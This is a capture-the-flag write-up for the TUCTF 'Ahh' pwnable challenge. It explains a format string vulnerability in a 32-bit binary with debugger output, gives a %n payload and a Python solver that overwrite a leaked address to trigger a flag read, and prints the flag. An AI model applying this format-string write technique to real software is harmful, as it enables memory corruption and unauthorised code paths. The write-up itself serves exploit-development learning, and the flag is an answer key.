# Ahh [Pwnable 433 points]

### Chall's description
```
Difficulty: easy
Whatever... I dunno

nc x.x.x.x 12345
```

#### File given for the chall
* [ehh](./ehh)

## Solution

```
$ file ehh
eeh: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32 .......
```

When executed the code displays the following message:
```
>Input interesting text here< 0x565cb028
```

then, it requires an input from stdin by using the read(0,stack_address, 0x18), and after, printf(stack_address) .. Aaah the old dear format string bug/features..

So now de facto, the address (addr_1) that was previously printed 99,9% means something, start the gdb-peda routine
```
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
The executable seems to be compiled without canary, and during execution addr_1 is compared to 0x18, and if equals system("/bin/cat flag") is then executed.

So now we should try to write 0x18 to addr_1, by using the printf, for more info about format string vulnerabilities read this interesting 2001's paper: https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf


```
=> 0x565556ee <main+126>:	call   0x565554b0 <printf@plt>
   0x565556f3 <main+131>:	add    esp,0x10
   0x565556f6 <main+134>:	mov    eax,DWORD PTR [ebx+0x28]
   0x565556fc <main+140>:	cmp    eax,0x18
   0x565556ff <main+143>:	jne    0x56555713 <main+163>
Guessed arguments:
arg[0]: 0xffffd138 ("Hi there\n")
[------------------------------------stack-------------------------------------]
0000| 0xffffd120 --> 0xffffd138 ("Hi there\n")
0004| 0xffffd124 --> 0xffffd138 ("Hi there\n")
0008| 0xffffd128 --> 0x18 
0012| 0xffffd12c --> 0x0 
0016| 0xffffd130 --> 0xf7fa23fc --> 0xf7fa3200 --> 0x0 
0020| 0xffffd134 --> 0x56557000 --> 0x1ef0 
0024| 0xffffd138 ("Hi there\n")
0028| 0xffffd13c ("here\n")
[------------------------------------------------------------------------------]
```

looking the printf stack-view, we note that our string starts at 6th position (ignoring the first arg).
so in this scenario, (addr_1=0x565cb028), the right input, could be:  *\x28\xb0\x5c\x56%24u%6$n*

the printf understands that; print out the string, and write one-byte (value 24) at address *(esp - 6x4). understanding this we can get all the 4 bytes. For some reason %24u doesn't work so instead i used %20u.

We can now write a script, or try all in one line (e.g. if addr_1 is like "0x56623028" , so the input could be; "(0bV%20u%6$n" )

```python
#!/usr/bin/env python`
import sys, itertools, subprocess, struct

def conv(num):
	return struct.pack("<I",num)

def main(args):
	proc=subprocess.Popen(["./ehh"] , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	ret=proc.stdout.readline()
	ret=int( ret[ret.find("0x"):].rstrip(), 16)
	buf = conv(ret)
	buf += "%20u%6$n"
	proc.stdin.write(buf + "\n")
	proc.stdin.flush()
	ret=proc.stdout.readlines()
	print(ret)
```

# The Flag:
	TUCTF{pr1n7f_15_pr377y_c00l_huh}

